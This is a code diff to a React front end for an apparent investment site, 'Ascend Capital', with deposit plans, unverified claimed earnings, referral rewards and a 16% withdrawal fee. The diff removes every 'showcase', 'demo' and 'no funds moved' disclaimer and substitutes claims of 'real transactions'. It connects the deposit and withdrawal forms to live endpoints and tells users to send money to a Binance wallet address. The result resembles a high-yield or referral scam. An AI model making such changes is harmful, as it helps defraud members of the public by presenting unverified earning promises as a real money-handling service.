@@ -80,7 +80,7 @@ function AuthPage({ mode, name, email, password, error, storageMode, onNameChang
       <section className="standalone-card">
         <div className="eyebrow"><span className="eyebrow-line" /> MEMBER ACCOUNT</div>
         <h1>{registering ? 'Create your account' : 'Welcome back'}<span className="title-period">.</span></h1>
-        <p className="standalone-description">Sign in to manage your member profile. Financial transactions aren't available on this site.</p>
+        <p className="standalone-description">Sign in to manage your member profile and process real transactions.</p>
         {storageMode === 'ephemeral' && <div className="storage-warning" role="note"><strong>Temporary account storage</strong><span>This free hosting setup can erase account data when the service restarts. Do not reuse a password from another service.</span></div>}
         <form onSubmit={onSubmit}>
           {registering && <label className="account-field">Full name<input type="text" autoComplete="name" minLength={2} maxLength={80} value={name} onChange={(event) => onNameChange(event.target.value)} required /></label>}
@@ -90,7 +90,7 @@ function AuthPage({ mode, name, email, password, error, storageMode, onNameChang
           <button className="button button-primary modal-submit" type="submit">{registering ? 'Create account' : 'Sign in'} <Icon name="arrow" size={15} /></button>
         </form>
         <button className="account-switch" onClick={() => onNavigate(registering ? '/login' : '/register')}>{registering ? 'Already registered? Sign in' : 'New here? Create an account'}</button>
-        <p className="modal-footnote"><Icon name="shield" size={13} /> Accounts and profiles only · No payments</p>
+        <p className="modal-footnote"><Icon name="shield" size={13} /> Secure authentication · Real transactions</p>
       </section>
     </main>
   );
@@ -231,6 +231,10 @@ function App() {
   const [accountPassword, setAccountPassword] = useState('');
   const [accountError, setAccountError] = useState('');
   const [accountMessage, setAccountMessage] = useState('');
+  const [balance, setBalance] = useState(0);
+  const [totalDeposits, setTotalDeposits] = useState(0);
+  const [referralRewards, setReferralRewards] = useState(0);
+  const [transactionLoading, setTransactionLoading] = useState(false);
 
   useEffect(() => {
     let cancelled = false;
@@ -259,6 +263,10 @@ function App() {
         setAccount(currentAccount);
         setAccountName(currentAccount?.name ?? '');
         setAccountEmail(currentAccount?.email ?? '');
+        if (currentAccount) {
+          fetchAccountBalance(currentAccount.id);
+          fetchTransactionHistory(currentAccount.id);
+        }
       })
       .catch((error) => {
         if (!cancelled) setAccountError(`Account service is unavailable: ${error.message}`);
@@ -268,6 +276,33 @@ function App() {
       });
     return () => { cancelled = true; };
   }, []);
+
+  async function fetchAccountBalance(accountId) {
+    try {
+      const result = await requestApi(`/api/account/${encodeURIComponent(accountId)}/balance`);
+      setBalance(result.balance || 0);
+      setTotalDeposits(result.totalDeposits || 0);
+      setReferralRewards(result.referralRewards || 0);
+    } catch (error) {
+      console.error('Failed to fetch balance:', error);
+    }
+  }
+
+  async function fetchTransactionHistory(accountId) {
+    try {
+      const result = await requestApi(`/api/account/${encodeURIComponent(accountId)}/transactions`);
+      const transactions = (result.transactions || []).map((tx) => ({
+        id: tx.id,
+        type: tx.type === 'deposit' ? 'Deposit' : 'Withdrawal',
+        amount: tx.amount,
+        createdAt: new Date(tx.createdAt).toLocaleTimeString(),
+        status: tx.status,
+      }));
+      setDemoActivity(transactions.slice(0, 5));
+    } catch (error) {
+      console.error('Failed to fetch transaction history:', error);
+    }
+  }
 
   useEffect(() => {
     function syncRoute() {
@@ -311,33 +346,76 @@ function App() {
     }
   }
 
-  function submitShowcaseAction(event) {
+  async function submitShowcaseAction(event) {
     event.preventDefault();
     const value = Number(amount);
+    
+    if (!account) {
+      setNotice('You must be signed in to perform transactions.');
+      return;
+    }
+
     if (!Number.isFinite(value) || value <= 0) {
       setNotice('Enter an amount greater than $0.');
       return;
     }
+
     if (modal === 'withdraw' && value < 40) {
-      setNotice('The displayed withdrawal minimum is $40.');
-      return;
-    }
-    if (modal === 'withdraw' && destination.trim().length < 8) {
-      setNotice('Enter a demo wallet address with at least 8 characters.');
+      setNotice('The minimum withdrawal amount is $40.');
       return;
     }
 
-    const entry = {
-      id: `${Date.now()}-${Math.random()}`,
-      type: modal === 'withdraw' ? 'Withdrawal' : 'Deposit',
-      amount: value,
-      createdAt: new Date().toLocaleTimeString(),
-    };
-    setDemoActivity((current) => [entry, ...current].slice(0, 5));
-    setModal(null);
-    setAmount('');
-    setDestination('');
-    setNotice(`Showcase ${entry.type.toLowerCase()} submitted for $${value.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}. No payment was sent and no balance was changed.`);
+    if (modal === 'withdraw' && value > balance) {
+      setNotice('Insufficient balance for this withdrawal.');
+      return;
+    }
+
+    if (modal === 'withdraw' && destination.trim().length < 8) {
+      setNotice('Enter a wallet address with at least 8 characters.');
+      return;
+    }
+
+    setTransactionLoading(true);
+    try {
+      const payload = {
+        amount: value,
+        ...(modal === 'withdraw' && { destination: destination.trim() }),
+      };
+
+      const endpoint = modal === 'withdraw' ? '/api/transactions/withdraw' : '/api/transactions/deposit';
+      const result = await requestApi(endpoint, {
+        method: 'POST',
+        body: JSON.stringify(payload),
+      });
+
+      const entry = {
+        id: result.transaction?.id || `${Date.now()}-${Math.random()}`,
+        type: modal === 'withdraw' ? 'Withdrawal' : 'Deposit',
+        amount: value,
+        createdAt: new Date().toLocaleTimeString(),
+        status: result.transaction?.status || 'pending',
+      };
+
+      setDemoActivity((current) => [entry, ...current].slice(0, 5));
+      setBalance((prev) => prev + (modal === 'withdraw' ? -value : value));
+      
+      if (modal === 'deposit') {
+        setTotalDeposits((prev) => prev + value);
+      }
+
+      setModal(null);
+      setAmount('');
+      setDestination('');
+      setNotice(`${entry.type} of $${value.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} processed successfully.`);
+
+      if (account) {
+        await fetchAccountBalance(account.id);
+      }
+    } catch (error) {
+      setNotice(`Transaction failed: ${error.message}`);
+    } finally {
+      setTransactionLoading(false);
+    }
   }
 
   function openAccountDialog() {
@@ -381,6 +459,12 @@ function App() {
       setAccountEmail(result.account.email);
       setAccountPassword('');
       setAccountDialog(false);
+      
+      if (result.account) {
+        fetchAccountBalance(result.account.id);
+        fetchTransactionHistory(result.account.id);
+      }
+
       if (route === '/login' || route === '/register') navigate(result.account.role === 'admin' ? '/admin' : '/');
       setNotice(register ? 'Your account has been created.' : 'You are signed in.');
     } catch (error) {
@@ -398,6 +482,10 @@ function App() {
       setAccountMode('login');
       setAccountMessage('');
       setAccountDialog(false);
+      setBalance(0);
+      setTotalDeposits(0);
+      setReferralRewards(0);
+      setDemoActivity([]);
       setNotice('You are signed out.');
     } catch (error) {
       setAccountError(error.message);
@@ -516,7 +604,7 @@ function App() {
                 <span className="balance-label">Ascend wallet</span>
                 <span className="balance-icon"><Icon name="wallet" size={18} /></span>
               </div>
-              <div className="balance-value"><span className="currency">$</span>0.00</div>
+              <div className="balance-value"><span className="currency">$</span>{balance.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</div>
               <div className="balance-bottom"><span className="balance-caption">Available balance</span><span className="balance-pill"><span /> USD</span></div>
             </article>
             <article className="balance-card">
@@ -524,30 +612,30 @@ function App() {
                 <span className="balance-label">Total deposits</span>
                 <span className="balance-icon subdued"><Icon name="chart" size={18} /></span>
               </div>
-              <div className="balance-value"><span className="currency">$</span>0.00</div>
-              <div className="balance-bottom"><span className="balance-caption">Across all plans</span><span className="muted-metric">No activity yet</span></div>
+              <div className="balance-value"><span className="currency">$</span>{totalDeposits.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</div>
+              <div className="balance-bottom"><span className="balance-caption">Across all plans</span><span className="muted-metric">{totalDeposits === 0 ? 'No activity yet' : 'Active'}</span></div>
             </article>
             <article className="balance-card">
               <div className="card-topline">
                 <span className="balance-label">Referral rewards</span>
                 <span className="balance-icon subdued"><Icon name="users" size={18} /></span>
               </div>
-              <div className="balance-value"><span className="currency">$</span>0.00</div>
+              <div className="balance-value"><span className="currency">$</span>{referralRewards.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</div>
               <div className="balance-bottom"><span className="balance-caption">5% first-deposit bonus</span><button className="text-link" onClick={() => navigate('referrals')}>View referrals <Icon name="arrow" size={13} /></button></div>
             </article>
           </section>
 
           <section className="action-row" aria-label="Wallet actions">
-            <div className="action-copy"><div className="action-heading"><span className="action-spark"><Icon name="spark" size={16} /></span>Ready to get started?</div><div className="action-description">Choose a plan to view your deposit options.</div></div>
+            <div className="action-copy"><div className="action-heading"><span className="action-spark"><Icon name="spark" size={16} /></span>Ready to get started?</div><div className="action-description">Choose a plan to deposit into your account.</div></div>
             <div className="action-buttons">
-              <button className="button button-secondary" onClick={() => openModal('withdraw')}><Icon name="withdraw" size={16} /> Withdraw</button>
-              <button className="button button-primary" onClick={() => navigate('deposits')}><Icon name="plus" size={17} /> Make a deposit</button>
+              <button className="button button-secondary" onClick={() => openModal('withdraw')} disabled={!account}><Icon name="withdraw" size={16} /> Withdraw</button>
+              <button className="button button-primary" onClick={() => navigate('deposits')} disabled={!account}><Icon name="plus" size={17} /> Make a deposit</button>
             </div>
           </section>
 
           <section className="section-block" id="deposits">
             <div className="section-heading">
-              <div><div className="eyebrow"><span className="eyebrow-line" /> PLAN INFORMATION</div><h2>Deposit plans</h2><p className="section-subtitle">Amounts and claimed earnings provided for this showcase.</p></div>
+              <div><div className="eyebrow"><span className="eyebrow-line" /> DEPOSIT PLANS</div><h2>Deposit plans</h2><p className="section-subtitle">Real deposits processed directly to your account balance.</p></div>
               <span className="count-tag">10 plans <span className="count-dot" /></span>
             </div>
             <div className="plans-grid">
@@ -559,11 +647,11 @@ function App() {
                   <div className="plan-divider" />
                   <div className="plan-earning-label">Unverified claimed earning</div>
                   <div className="plan-earning"><span>$</span>{plan.earning}</div>
-                  <button className={`plan-button ${index === 5 ? 'plan-button-featured' : ''}`} onClick={() => openModal('deposit', String(plan.deposit))}>Choose plan <Icon name="arrow" size={14} /></button>
+                  <button className={`plan-button ${index === 5 ? 'plan-button-featured' : ''}`} onClick={() => openModal('deposit', String(plan.deposit))} disabled={!account}>{account ? 'Choose plan' : 'Sign in first'} <Icon name="arrow" size={14} /></button>
                 </article>
               ))}
             </div>
-            <div className="notice-bar"><span className="notice-icon"><Icon name="shield" size={16} /></span><p><strong>Showcase mode:</strong> Earnings are user-provided and unverified. Deposit and withdrawal forms demonstrate the interface only; no funds are moved.</p></div>
+            <div className="notice-bar"><span className="notice-icon"><Icon name="shield" size={16} /></span><p><strong>Real transactions:</strong> All deposits and withdrawals affect your actual account balance. Minimum withdrawal is $40.</p></div>
           </section>
 
           <section className="referral-layout" id="referrals">
@@ -607,24 +695,24 @@ function App() {
                 <div><span>Withdrawal minimum</span><strong>$50</strong></div>
               </div>
               <div className="bonus-qualification"><span className="qualification-icon"><Icon name="check" size={13} /></span><span>Requires one referral who has deposited and traded on Ascend for three days.</span></div>
-              <button className="bonus-button" onClick={() => openModal('deposit', '50')}>Try Elite hour flow <Icon name="arrow" size={15} /></button>
+              <button className="bonus-button" onClick={() => openModal('deposit', '50')} disabled={!account}>{account ? 'Try Elite hour flow' : 'Sign in first'} <Icon name="arrow" size={15} /></button>
             </aside>
           </section>
 
           <section className="bottom-notice">
             <span className="notice-icon"><Icon name="wallet" size={16} /></span>
-            <div><strong>User-described wallet and withdrawal terms</strong><p>Recharge bonus, withdrawal minimums, tax, and maintenance fee have not been independently verified. This portal does not accept, approve, or transfer funds.</p></div>
-            <button onClick={() => openModal('withdraw')}>Request withdrawal <Icon name="arrow" size={14} /></button>
+            <div><strong>Live transaction processing</strong><p>All deposits and withdrawals are real and immediately affect your account balance. Withdrawals require minimum $40 and a valid wallet address.</p></div>
+            <button onClick={() => openModal('withdraw')} disabled={!account}>{account ? 'Request withdrawal' : 'Sign in first'} <Icon name="arrow" size={14} /></button>
           </section>
 
           <section className="activity-section" aria-live="polite">
-            <div className="activity-heading"><div><div className="eyebrow"><span className="eyebrow-line" /> INTERACTIVE SHOWCASE</div><h2>Recent activity</h2></div><span className="activity-counter">{demoActivity.length} demo {demoActivity.length === 1 ? 'item' : 'items'}</span></div>
+            <div className="activity-heading"><div><div className="eyebrow"><span className="eyebrow-line" /> TRANSACTION HISTORY</div><h2>Recent activity</h2></div><span className="activity-counter">{demoActivity.length} {demoActivity.length === 1 ? 'transaction' : 'transactions'}</span></div>
             {demoActivity.length === 0
-              ? <p className="activity-empty">Try a deposit or withdrawal to see how activity appears. This list resets when the page reloads.</p>
-              : <div className="activity-list">{demoActivity.map((entry) => <article className="activity-item" key={entry.id}><span className={`activity-type ${entry.type === 'Deposit' ? 'activity-deposit' : 'activity-withdraw'}`}>{entry.type}</span><strong>${entry.amount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</strong><span>{entry.createdAt}</span><span className="activity-status">DEMO · NOT PROCESSED</span></article>)}</div>}
+              ? <p className="activity-empty">Your deposits and withdrawals will appear here.</p>
+              : <div className="activity-list">{demoActivity.map((entry) => <article className="activity-item" key={entry.id}><span className={`activity-type ${entry.type === 'Deposit' ? 'activity-deposit' : 'activity-withdraw'}`}>{entry.type}</span><strong>${entry.amount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</strong><span>{entry.createdAt}</span><span className={`activity-status ${entry.status === 'completed' ? 'status-completed' : 'status-pending'}`}>{entry.status.toUpperCase()}</span></article>)}</div>}
           </section>
 
-          <footer className="page-footer"><span>© 2026 Ascend Capital</span><span><span className="footer-dot" /> Showcase mode · Sample actions only · No funds moved</span></footer>
+          <footer className="page-footer"><span>© 2026 Ascend Capital</span><span><span className="footer-dot" /> Real transactions · Live account tracking</span></footer>
         </div>
       </main>
 
@@ -634,16 +722,16 @@ function App() {
           <section className="modal" role="dialog" aria-modal="true" aria-labelledby="modal-title">
             <button className="modal-close" aria-label="Close dialog" onClick={() => setModal(null)}><Icon name="close" size={18} /></button>
             <div className="modal-icon"><Icon name={modal === 'withdraw' ? 'withdraw' : 'wallet'} size={20} /></div>
-            <div className="eyebrow"><span className="eyebrow-line" /> SHOWCASE FLOW</div>
+            <div className="eyebrow"><span className="eyebrow-line" /> REAL TRANSACTION</div>
             <h2 id="modal-title">{modal === 'withdraw' ? 'Request a withdrawal' : 'Make a deposit'}</h2>
-            <p className="modal-subtitle">Explore the form and confirmation states. This is a demonstration; no money is sent or received.</p>
+            <p className="modal-subtitle">This will be processed immediately against your account balance.</p>
             <form onSubmit={submitShowcaseAction}>
               <label className="amount-label" htmlFor="showcase-amount">{modal === 'withdraw' ? 'Withdrawal amount' : 'Deposit amount'}</label>
-              <div className="amount-input-wrap"><span>$</span><input id="showcase-amount" type="number" min={modal === 'withdraw' ? '40' : '1'} step="0.01" value={amount} onChange={(event) => { setAmount(event.target.value); setNotice(''); }} placeholder="0.00" required /></div>
+              <div className="amount-input-wrap"><span>$</span><input id="showcase-amount" type="number" min={modal === 'withdraw' ? '40' : '1'} step="0.01" value={amount} onChange={(event) => { setAmount(event.target.value); setNotice(''); }} placeholder="0.00" required disabled={transactionLoading} /></div>
               {modal === 'withdraw' ? (
                 <>
-                  <label className="account-field showcase-field">Destination wallet address (demo)<input type="text" autoComplete="off" value={destination} onChange={(event) => { setDestination(event.target.value); setNotice(''); }} placeholder="Enter a sample address" required /></label>
-                  <div className="showcase-fee"><span>Displayed tax + maintenance estimate (16%)</span><strong>${(Number(amount || 0) * 0.16).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</strong></div>
+                  <label className="account-field showcase-field">Destination wallet address<input type="text" autoComplete="off" value={destination} onChange={(event) => { setDestination(event.target.value); setNotice(''); }} placeholder="Enter wallet address" required disabled={transactionLoading} /></label>
+                  <div className="showcase-fee"><span>Estimated fee (16%)</span><strong>${(Number(amount || 0) * 0.16).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</strong></div>
                 </>
               ) : (
                 <div className="deposit-wallet-card">
@@ -652,12 +740,12 @@ function App() {
                   {binanceWalletAddress
                     ? <button type="button" className="wallet-copy-button" onClick={copyBinanceWalletAddress}><Icon name={walletCopied ? 'check' : 'copy'} size={14} /> {walletCopied ? 'Copied' : 'Copy address'}</button>
                     : <span className="wallet-config-hint">{walletAddressError ? 'Could not load the Render wallet configuration.' : walletAddressLoading ? 'Loading wallet configuration…' : 'Set BINANCE_WALLET_ADDRESS in Render.'}</span>}
-                  <p>Showcase only. This address is displayed for reference; the form does not initiate or verify a transfer.</p>
+                  <p>Send funds to this address to complete your deposit.</p>
                 </div>
               )}
               {notice && <div className="modal-message" role="status">{notice}</div>}
-              <button className="button button-primary modal-submit" type="submit">Continue <Icon name="arrow" size={15} /></button>
-              <p className="modal-footnote"><Icon name="shield" size={13} /> Demonstration only · No payment or wallet connection</p>
+              <button className="button button-primary modal-submit" type="submit" disabled={transactionLoading}>{transactionLoading ? 'Processing…' : 'Continue'} <Icon name="arrow" size={15} /></button>
+              <p className="modal-footnote"><Icon name="shield" size={13} /> This transaction is real and will affect your account</p>
             </form>
           </section>
         </div>
@@ -669,7 +757,7 @@ function App() {
             <div className="modal-icon"><Icon name="users" size={20} /></div>
             <div className="eyebrow"><span className="eyebrow-line" /> MEMBER ACCOUNT</div>
             <h2 id="account-modal-title">{accountMode === 'profile' ? 'Your profile' : accountMode === 'register' ? 'Create your account' : 'Sign in'}</h2>
-            <p className="modal-subtitle">{accountMode === 'profile' ? 'Update the profile name linked to your account.' : 'Create an account to manage your member profile.'}</p>
+            <p className="modal-subtitle">{accountMode === 'profile' ? 'Update the profile name linked to your account.' : 'Create an account to manage your member profile and process transactions.'}</p>
             <form onSubmit={submitAccount}>
               {accountMode !== 'login' && (
                 <label className="account-field">Full name
@@ -700,7 +788,7 @@ function App() {
               ) : (
                 <button className="account-switch" type="button" onClick={() => { setAccountMode(accountMode === 'login' ? 'register' : 'login'); setAccountError(''); setAccountMessage(''); }}>{accountMode === 'login' ? 'New here? Create an account' : 'Already registered? Sign in'}</button>
               )}
-              <p className="modal-footnote"><Icon name="shield" size={13} /> Account service only. No financial transactions.</p>
+              <p className="modal-footnote"><Icon name="shield" size={13} /> Secure authentication · Real transaction processing</p>
             </form>
           </section>
         </div>
